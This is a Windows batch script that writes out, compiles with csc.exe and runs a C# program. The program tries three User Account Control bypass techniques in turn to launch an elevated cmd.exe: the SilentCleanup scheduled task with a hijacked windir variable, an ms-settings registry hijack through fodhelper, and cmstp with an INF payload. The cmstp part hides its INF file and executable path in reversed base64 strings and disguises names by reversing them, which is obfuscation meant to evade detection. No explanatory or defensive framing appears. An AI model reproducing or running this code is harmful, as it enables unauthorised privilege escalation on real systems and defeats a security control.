@echo off
setlocal EnableDelayedExpansion

:: Batch file to compile and run UAC bypass helpers (WinDirSluiHelper, FodHelper, CmstpHelper)
:: This script assumes .NET Framework is installed with csc.exe available

:: Define paths and file names
set "SourceFile=UacBypass.cs"
set "ExeFile=UacBypass.exe"
set "TempDir=%TEMP%\UacBypass"
set "CompilerPath=%SystemRoot%\Microsoft.NET\Framework64\v4.0.30319\csc.exe"

:: Check if compiler exists
if not exist "%CompilerPath%" (
    echo Error: C# compiler not found at %CompilerPath%
    echo Please ensure .NET Framework is installed.
    pause
    exit /b 1
)

:: Create temporary directory if it doesn't exist
if not exist "%TempDir%" (
    mkdir "%TempDir%"
)

:: Write the C# source code to a temporary file
echo Writing source code to %TempDir%\%SourceFile%...
(
    echo using System;
    echo using System.Diagnostics;
    echo using System.IO;
    echo using System.Threading.Tasks;
    echo using Microsoft.Win32;
    echo.
    echo namespace UacHelper
    echo {
    echo     class Program
    echo     {
    echo         static async Task Main(string[] args)
    echo         {
    echo             Console.WriteLine("Attempting UAC bypass...");
    echo             string targetPath = @"C:\Windows\System32\cmd.exe";
    echo.
    echo             // Try WinDirSluiHelper
    echo             Console.WriteLine("Trying WinDirSluiHelper...");
    echo             bool result1 = await WinDirSluiHelper.Run(targetPath);
    echo             Console.WriteLine("WinDirSluiHelper result: " + result1);
    echo             if (result1) return;
    echo.
    echo             // Try FodHelper
    echo             Console.WriteLine("Trying FodHelper...");
    echo             bool result2 = await FodHelper.Run(targetPath);
    echo             Console.WriteLine("FodHelper result: " + result2);
    echo             if (result2) return;
    echo.
    echo             // Try CmstpHelper
    echo             Console.WriteLine("Trying CmstpHelper...");
    echo             bool result3 = CmstpHelper.Run(targetPath);
    echo             Console.WriteLine("CmstpHelper result: " + result3);
    echo         }
    echo     }
    echo.
    echo     public class WinDirSluiHelper
    echo     {
    echo         public static async Task^<bool^> Run(string path)
    echo         {
    echo             bool worked = false;
    echo             var originalWindir = Environment.GetEnvironmentVariable("windir");
    echo             try
    echo             {
    echo                 Environment.SetEnvironmentVariable("windir", "\"" + path + "\"" + " ;#", EnvironmentVariableTarget.Process);
    echo                 var processStartInfo = new ProcessStartInfo
    echo                 {
    echo                     FileName = "SCHTASKS.exe",
    echo                     Arguments = @"/run /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I",
    echo                     UseShellExecute = false,
    echo                     RedirectStandardError = true,
    echo                     RedirectStandardOutput = true,
    echo                     CreateNoWindow = true,
    echo                     WindowStyle = ProcessWindowStyle.Hidden
    echo                 };
    echo                 using (var process = Process.Start(processStartInfo))
    echo                 {
    echo                     while (!process.HasExited)
    echo                         await Task.Delay(100);
    echo                     if (process.ExitCode == 0)
    echo                         worked = true;
    echo                 }
    echo             }
    echo             catch
    echo             {
    echo                 worked = false;
    echo             }
    echo             finally
    echo             {
    echo                 Environment.SetEnvironmentVariable("windir", originalWindir, EnvironmentVariableTarget.Process);
    echo             }
    echo             return worked;
    echo         }
    echo     }
    echo.
    echo     public class FodHelper
    echo     {
    echo         [System.Runtime.InteropServices.DllImport("kernel32.dll", SetLastError = true)]
    echo         private static extern bool Wow64DisableWow64FsRedirection(ref IntPtr ptr);
    echo.
    echo         [System.Runtime.InteropServices.DllImport("kernel32.dll", SetLastError = true)]
    echo         private static extern bool Wow64RevertWow64FsRedirection(IntPtr ptr);
    echo.
    echo         [System.Runtime.InteropServices.DllImport("kernel32.dll")]
    echo         private static extern bool CreateProcess(
    echo             string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes,
    echo             IntPtr lpThreadAttributes, bool bInheritHandles, int dwCreationFlags,
    echo             IntPtr lpEnvironment, string lpCurrentDirectory,
    echo             ref STARTUPINFO lpStartupInfo, ref PROCESS_INFORMATION lpProcessInformation);
    echo.
    echo         [System.Runtime.InteropServices.StructLayout(System.Runtime.InteropServices.LayoutKind.Sequential)]
    echo         struct STARTUPINFO
    echo         {
    echo             public Int32 cb;
    echo             public string lpReserved;
    echo             public string lpDesktop;
    echo             public string lpTitle;
    echo             public Int32 dwX;
    echo             public Int32 dwY;
    echo             public Int32 dwXSize;
    echo             public Int32 dwYSize;
    echo             public Int32 dwXCountChars;
    echo             public Int32 dwYCountChars;
    echo             public Int32 dwFillAttribute;
    echo             public Int32 dwFlags;
    echo             public Int16 wShowWindow;
    echo             public Int16 cbReserved2;
    echo             public IntPtr lpReserved2;
    echo             public IntPtr hStdInput;
    echo             public IntPtr hStdOutput;
    echo             public IntPtr hStdError;
    echo         }
    echo.
    echo         [System.Runtime.InteropServices.StructLayout(System.Runtime.InteropServices.LayoutKind.Sequential)]
    echo         internal struct PROCESS_INFORMATION
    echo         {
    echo             public IntPtr hProcess;
    echo             public IntPtr hThread;
    echo             public int dwProcessId;
    echo             public int dwThreadId;
    echo         }
    echo.
    echo         public static async Task^<bool^> Run(string path)
    echo         {
    echo             IntPtr test = IntPtr.Zero;
    echo             bool worked = false;
    echo             Wow64DisableWow64FsRedirection(ref test);
    echo             RegistryKey alwaysNotify = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System");
    echo             string consentPrompt = alwaysNotify.GetValue("ConsentPromptBehaviorAdmin").ToString();
    echo             string secureDesktopPrompt = alwaysNotify.GetValue("PromptOnSecureDesktop").ToString();
    echo             alwaysNotify.Close();
    echo.
    echo             if (consentPrompt == "2" ^& secureDesktopPrompt == "1")
    echo             {
    echo                 return worked;
    echo             }
    echo.
    echo             RegistryKey newkey = Registry.CurrentUser.OpenSubKey(@"Software\Classes\", true);
    echo             newkey.CreateSubKey(@"ms-settings\Shell\Open\command");
    echo             RegistryKey fodhelper = Registry.CurrentUser.OpenSubKey(@"Software\Classes\ms-settings\Shell\Open\command", true);
    echo             fodhelper.SetValue("DelegateExecute", "");
    echo             fodhelper.SetValue("", path);
    echo             fodhelper.Close();
    echo             STARTUPINFO si = new STARTUPINFO();
    echo             si.cb = System.Runtime.InteropServices.Marshal.SizeOf(si);
    echo             PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
    echo             worked = CreateProcess(
    echo                 null,
    echo                 "cmd /c start \"\" \"%windir%\\system32\\fodhelper.exe\"",
    echo                 IntPtr.Zero,
    echo                 IntPtr.Zero,
    echo                 false,
    echo                 0x08000000,
    echo                 IntPtr.Zero,
    echo                 null,
    echo                 ref si,
    echo                 ref pi);
    echo             await Task.Delay(2000);
    echo             newkey.DeleteSubKeyTree("ms-settings");
    echo             Wow64RevertWow64FsRedirection(test);
    echo             return worked;
    echo         }
    echo     }
    echo.
    echo     public class CmstpHelper
    echo     {
    echo         public static string Base64Encode(string plainText)
    echo         {
    echo             var plainTextBytes = System.Text.Encoding.UTF8.GetBytes(plainText);
    echo             return System.Convert.ToBase64String(plainTextBytes);
    echo         }
    echo         public static string Base64Decode(string base64EncodedData)
    echo         {
    echo             var base64EncodedBytes = System.Convert.FromBase64String(base64EncodedData);
    echo             return System.Text.Encoding.UTF8.GetString(base64EncodedBytes);
    echo         }
    echo         public static string pt1 = "NEc1RXZTVmcQ5WdStlCNoQDu9Wa0NWZTNHZuFWbt92QwVHdlNVZyBlb1JVPzRmbh1WbvNEc1RXZTVmcQ5WdSpQDzJXZzVFbsFkbvlGdjV2U0NXZER3culEdzV3Q942bpRXYulGdzVGRt9GdzV3QK0QXsxWY0NnbJRHb1FmZlR0WK0gCNUjLy0jROlEZlNmbhZHZBpQDk82ZhNWaoNGJ9Umc1RXYudWaTpQDd52bpNnclZ3W";
    echo         public static string pt2 = "UsxWY0NnbJVGbpZ2byBlIgwiIFhVRuIzMSdUTNNEXzhGdhBFIwBXQc52bpNnclZFduVmcyV3QcN3dvRmbpdFX0Z2bz9mcjlWTcVkUBdFVG90UiACLi0ETLhkIK0QXu9Wa0NWZTRUSEx0XyV2UVxGbBtlCNoQD3ACLu9Wa0NWZTRUSEx0XyV2UVxGbB1TMwATO0wCMwATO0oQDdNnclNXVsxWQu9Wa0NWZTR3clREdz5WS0NXdDtlCNoQDG9CIlhXZuAHdz12Yg0USvACbsl2arNXY0pQDF5USM9FROFUTN90QfV0QBxEUFJlCNwGbhR3culGIvRHIz5WanVmQgAXd0V2UgUmcvZWZCBib1JHIlJGIsxWa3BSZyVGSgMHZuFWbt92QgsjCN0lbvlGdjV2UzRmbh1Wbv";
    echo         public static string pt3 = "gCNoQDi4EUWBncvdkI9UWbh50Y2NFdy9GaTpQDi4EUWBncvdkI9UWbh5UZjlmdyV2UK0QXzdmbpJHdTtlCNoQDiICIsISJy9mcyVEZlR3YlBHel5WVlICIsICa0FG";
    echo         [System.Runtime.InteropServices.DllImport("user32.dll")] 
    echo         public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
    echo         [System.Runtime.InteropServices.DllImport("user32.dll", SetLastError = true)] 
    echo         public static extern bool SetForegroundWindow(IntPtr hWnd);
    echo         public static string path = "UGel5Cc0NXbjxlMz0WZ0NXezx1c39GZul2dcpzY";
    echo.
    echo         public static string Reverse(string s)
    echo         {
    echo             char[] charArray = s.ToCharArray();
    echo             Array.Reverse(charArray);
    echo             return new string(charArray);
    echo         }
    echo         public static string SetData(string CommandToExecute)
    echo         {
    echo             string RandomFileName = Path.GetRandomFileName().Split(Convert.ToChar("."))[0];
    echo             string TemporaryDir = "C:\\" + Reverse("swodniw") + "\\" + Reverse("pmet");
    echo             System.Text.StringBuilder OutputFile = new System.Text.StringBuilder();
    echo             OutputFile.Append(TemporaryDir);
    echo             OutputFile.Append("\\");
    echo             OutputFile.Append(RandomFileName);
    echo             OutputFile.Append("." + Reverse(Reverse(Reverse("ni"))) + Reverse("f"));
    echo             string data = Reverse(pt1) + Reverse(pt3 + pt2);
    echo             data = Base64Decode(data + "==");
    echo             System.Text.StringBuilder newInfData = new System.Text.StringBuilder(data);
    echo             var f = "MOC_ECALPER";
    echo             f += "";
    echo             newInfData.Replace(Reverse("ENIL_DNAM" + f), CommandToExecute);
    echo             File.WriteAllText(OutputFile.ToString(), newInfData.ToString());
    echo             return OutputFile.ToString();
    echo         }
    echo         public static void Kill()
    echo         {
    echo             foreach (var process in Process.GetProcessesByName(Reverse("ptsmc")))
    echo             {
    echo                 process.Kill();
    echo                 process.Dispose();
    echo             }
    echo         }
    echo         public static bool Run(string CommandToExecute)
    echo         {
    echo             string datapath = Base64Decode(Reverse(path) + "=");
    echo             if (!File.Exists(datapath))
    echo             {
    echo                 return false;
    echo             }
    echo             System.Text.StringBuilder InfFile = new System.Text.StringBuilder();
    echo             InfFile.Append(SetData(CommandToExecute));
    echo             ProcessStartInfo startInfo = new ProcessStartInfo(datapath);
    echo             startInfo.Arguments = "/" + Reverse("ua") + " " + InfFile.ToString();
    echo             startInfo.UseShellExecute = false;
    echo             Process.Start(startInfo).Dispose();
    echo             IntPtr windowHandle = new IntPtr();
    echo             windowHandle = IntPtr.Zero;
    echo             do
    echo             {
    echo                 windowHandle = SetWindowActive(Reverse("ptsmc"));
    echo             } while (windowHandle == IntPtr.Zero);
    echo             System.Windows.Forms.SendKeys.SendWait(Reverse(Reverse(Reverse(Reverse("{")))) + Reverse(Reverse("ENT")) + Reverse("}RE"));
    echo             return true;
    echo         }
    echo         public static IntPtr SetWindowActive(string ProcessName)
    echo         {
    echo             Process[] target = Process.GetProcessesByName(ProcessName);
    echo             if (target.Length == 0) return IntPtr.Zero;
    echo             target[0].Refresh();
    echo             IntPtr WindowHandle = new IntPtr();
    echo             WindowHandle = target[0].MainWindowHandle;
    echo             if (WindowHandle == IntPtr.Zero) return IntPtr.Zero;
    echo             SetForegroundWindow(WindowHandle);
    echo             ShowWindow(WindowHandle, 5);
    echo             foreach (Process process in target) 
    echo             { 
    echo                 process.Dispose();
    echo             }
    echo             return WindowHandle;
    echo         }
    echo     }
    echo }
) > "%TempDir%\%SourceFile%"

:: Compile the C# code
echo Compiling %SourceFile% to %ExeFile%...
"%CompilerPath%" /out:"%TempDir%\%ExeFile%" /target:exe "%TempDir%\%SourceFile%"

:: Check if compilation succeeded
if %ERRORLEVEL% neq 0 (
    echo Error: Compilation failed.
    pause
    exit /b 1
)

:: Run the compiled executable
echo Running UAC bypass executable...
start "" "%TempDir%\%ExeFile%"

endlocal
pause
exit /b 0
